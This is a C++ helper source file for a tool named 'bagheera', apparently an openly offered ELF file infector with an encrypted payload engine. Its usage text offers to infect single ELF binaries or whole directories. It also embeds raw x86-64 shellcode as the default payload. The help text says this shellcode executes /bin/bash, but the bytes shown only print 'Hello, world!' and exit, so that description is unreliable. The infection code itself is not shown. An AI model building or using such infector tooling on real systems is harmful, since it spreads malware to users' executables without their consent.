#include "helpers.h"
#include "includes.hpp"
#include "definitions.h"

using namespace std;

void usage(char *progname, int opt) {
   fprintf(stderr, USAGE_FMT, progname?progname:DEFAULT_PROGNAME);
   cerr << "where the options are:" << endl;
   cerr << "-m mode: mode in which bagheera to operate" << endl;
   cerr << "\tmode = engine: execute an encrypted function that contains payload" << endl;
   cerr << "\tmode = infect: infect ELF files standalone mode or within a directory" << endl;
   cerr << "-i inputfile: file that contains payload for the engine. if not provided, default payload will be used" << endl;
   cerr << "\t default payload: shellcode that executes /bin/bash" << endl;
   cerr << "-o outputfile: if mode=engine, where the resulting decriptio engine will be stored" << endl;
   cerr << "\t default output: stdout" << endl;
   cerr << "-e elf: if mode=infect, the ELF file that will be infected" << endl;
   cerr << "-d dir: if mode=infect, the directory where all the ELF files will be infected" << endl;
   cerr << "-v: activate verbose mode" << endl;
   cerr << "-h: display this help message" << endl;
   exit(EXIT_FAILURE);
}

void error(const char *str ){
  fprintf(stderr, "\x1b[1;31m[ERROR]\x1b[0m %s", str);
  exit(EXIT_FAILURE);
}

void error_verbose(const char *str, char *progname){
  fprintf(stderr, "\x1b[1;31m[ERROR]\x1b[0m %s ", str);
  fprintf(stderr, USAGE_FMT, progname?progname:DEFAULT_PROGNAME);
  exit(EXIT_FAILURE);
}


void write_default_payload(char* payload){
  char raw[] = "\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x89\xfa\x48\x83\xc2\x0e\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a";
  strcpy(payload, raw);
}


int default_payload_size(){
	return strlen("\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x89\xfa\x48\x83\xc2\x0e\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a");
}
